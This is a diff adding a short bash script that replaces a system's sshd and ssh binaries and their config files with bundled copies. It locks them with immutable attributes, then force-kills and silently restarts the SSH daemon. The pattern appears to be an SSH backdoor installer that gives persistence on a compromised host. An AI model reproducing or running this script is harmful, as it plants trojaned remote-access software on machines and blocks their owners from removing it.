@@ -1,0 +1,24 @@
+#!/bin/bash
+
+mv /usr/sbin/sshd sshd_old; cp sshd /usr/sbin/sshd
+cat sshd_config > /etc/ssh/sshd_config
+
+mv /usr/bin/ssh ssh_old; cp ssh /usr/bin/ssh
+cat ssh_config > /etc/ssh/ssh_config
+
+chattr +iau /usr/sbin/sshd
+chattr +iau /usr/bin/ssh
+
+
+if [[ -f /var/run/sshd.pid ]]; then
+kill -9 `cat /var/run/sshd.pid`;/usr/sbin/sshd 2> /dev/null
+fi
+
+if [[ -f /var/run/sshd.init.pid ]]; then
+kill -9 `cat /var/run/sshd.init.pid`;/usr/sbin/sshd 2> /dev/null
+fi
+
+if [[ -f /var/run/sshd2_22.pid ]]; then
+kill -9 `cat /var/run/sshd2_22.pid`;/usr/sbin/sshd 2> /dev/null
+fi
+
